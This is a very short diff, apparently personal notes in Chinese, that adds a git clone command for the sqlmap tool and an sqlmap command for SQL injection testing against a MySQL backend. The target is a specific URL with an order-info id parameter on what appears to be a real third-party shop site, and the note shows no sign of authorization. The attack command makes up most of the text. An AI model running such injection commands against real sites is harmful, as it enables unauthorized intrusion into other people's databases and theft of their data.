@@ -1,0 +1,6 @@
+下载
+git clone https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
+
+
+对于后端是mysql的数据库进行注入测试
+python sqlmap.py -u 'http://www.yunqixiu.com/legend/shop/warehouse/order/info/ng?id=136886' --level 2 --dbms=mysql
